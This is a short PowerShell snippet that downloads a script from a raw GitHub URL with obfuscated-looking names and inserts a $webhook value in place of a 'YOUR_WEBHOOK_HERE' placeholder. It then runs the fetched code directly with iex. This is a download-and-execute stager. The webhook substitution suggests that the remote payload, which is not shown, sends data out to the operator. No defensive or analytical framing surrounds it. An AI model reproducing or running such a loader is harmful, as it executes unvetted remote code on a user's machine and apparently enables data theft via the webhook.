$powershell_url = "https://raw.githubusercontent.com/VD23K23ZX94/GT1NKV98IUYXZ4/main/main.ps1"

#replace YOUR_WEBHOOK_HERE with $webhook
$content = (iwr -Uri $powershell_url -UseBasicParsing) -replace "YOUR_WEBHOOK_HERE", "$webhook"

iex $content